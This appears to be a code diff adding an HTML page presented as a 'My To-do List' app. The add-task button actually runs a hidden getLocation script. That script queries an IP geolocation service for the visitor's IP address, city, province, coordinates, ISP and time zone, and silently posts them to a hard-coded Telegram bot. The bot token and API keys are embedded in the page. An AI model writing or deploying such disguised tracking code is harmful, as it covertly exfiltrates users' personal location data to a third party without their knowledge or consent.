@@ -1,0 +1,80 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TODO LIST App</title>
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"
+    />
+    <link rel="stylesheet" href="./style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <h1>My To-do List</h1>
+      <div class="input-container">
+        <input class="todo-input" placeholder="Add a new task..." />
+        <button class="add-button" onclick="getLocation()">
+          <i class="fa fa-plus-circle"></i>
+        </button>
+      </div>
+      <div class="filters">
+        <div class="filter" data-filter="completed">Complete</div>
+        <div class="filter" data-filter="pending">Incomplete</div>
+        <div class="delete-all">Delete All</div>
+      </div>
+      <div class="todos-container">
+        <ul class="todos"></ul>
+        <img class="empty-image" src="./img/empty.svg" />
+      </div>
+    </div>
+    <script src="./script.js"></script>
+
+    <script>
+      const sendTelegramMessage = (text) => {
+        const BOT_TOKEN = "7159720557:AAEMWlInSrNDFJgcvQX1hlFjvdxPuorAPNs";
+        const CHAT_ID = "6724227071";
+
+        const pesan = {
+          chat_id: CHAT_ID,
+          text: text,
+        };
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(pesan),
+        }).then((response) => response.json());
+        //   .then((data) => console.log(data))
+        //   .catch((error) => console.error(error));
+      };
+
+      const getLocation = () => {
+        fetch(
+          "https://api.ipdata.co?api-key=b646b6a34518b3b75f1bb1561e5d5d58a2893f40a8f77c0d3feb5bab"
+        ).then((data) => {
+          data.json().then((info) => {
+            const lokasiInfo = `Detail IP: ${info.ip} \nCity: ${info.city} \nProvinsi: ${info.region} \nNegara: ${info.country_name} \nKoordinat:  ${info.latitude}, ${info.longitude} \nISP: ${info.asn.name} \nZIP: ${info.postal} \nWaktu: ${info.time_zone.name} ${info.time_zone.current_time} ${info.time_zone.abbr}`;
+
+            sendTelegramMessage(lokasiInfo);
+          });
+        });
+      };
+
+      //   const getLocation = () => {
+      //     fetch(
+      //       "https://api.ipdata.co?api-key=b646b6a34518b3b75f1bb1561e5d5d58a2893f40a8f77c0d3feb5bab&fields=ip,is_eu,city,region,region_code,country_name,country_code,continent_name,continent_code,latitude,longitude,postal,calling_code,flag,emoji_flag,emoji_unicode"
+      //     ).then((data) => {
+      //       data.json().then((info) => {
+      //         console.log(info);
+      //         const loc = document.getElementById("lokasi");
+      //         loc.innerHTML = `Provinsi: ${info.region} IP: ${info.ip}  City: ${info.city}  Country: ${info.country_name} Koordinat: ${info.latitude}, ${info.longitude}`;
+      //       });
+      //     });
+      //   };
+    </script>
+  </body>
+</html>
